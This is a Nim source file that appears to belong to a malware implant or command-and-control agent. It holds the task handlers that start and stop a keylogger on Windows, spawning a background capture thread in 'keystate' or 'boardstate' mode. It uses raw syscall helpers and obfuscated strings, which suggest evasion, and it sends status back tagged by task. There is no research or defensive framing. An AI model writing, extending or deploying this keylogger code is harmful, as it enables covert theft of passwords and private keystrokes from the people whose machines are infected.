from std/locks import acquire, release
from std/random import rand
import ../../utils/global
import ../../utils/winapi/syscall
import ../execution/core
import ./shared
import ./boardstate
import ./keystate

proc stop*() =
  # Stops the active key logger capture
  if captureMode == cmKeystate:
    notifyKeystateStop()
  stopWorker()

proc run_keylogger_start*(params, taskTag: string; buf: var openArray[char]): int =
  # Main function that starts the key logger
  klOutParams = params
  klFlushSeq = 0
  if taskTag.len > 0:
    klStreamTag = taskTag
  else:
    klStreamTag = $rand(100_000_000 .. 999_999_999)
  let mode = parseCaptureMethod(params)
  if mode == cmInvalid:
    return writeErr(obf("invalid method. Use keystate or boardstate."), buf)
  parseBoardPollMs(params)

  ensureKlMtx()
  acquire(klMtx)
  if active:
    release(klMtx)
    return writeErr(obf("keylogger already running"), buf)
  let needThread = th == nil or threadWorkerMode != mode
  captureMode = mode
  active = true
  parked = false
  batch.setLen(0)
  klLastKeyMs = 0
  release(klMtx)

  if needThread:
    if th == nil:
      inc bgWorkers
    let worker =
      if mode == cmKeystate:
        cast[pointer](workerKeystate)
      else:
        cast[pointer](workerBoardstate)
    let h = createThread(worker, nil)
    if h == nil:
      dec bgWorkers
      ensureKlMtx()
      acquire(klMtx)
      active = false
      release(klMtx)
      return writeErr(obf("keylogger start failed"), buf)
    ensureKlMtx()
    acquire(klMtx)
    th = h
    threadWorkerMode = mode
    release(klMtx)

  writeMsg(obf("Keylogger started."), buf)

proc run_keylogger_stop*(_: string; buf: var openArray[char]): int =
  # Stops the key logger and writes the status
  stop()
  writeMsg(obf("Keylogger stopped."), buf)
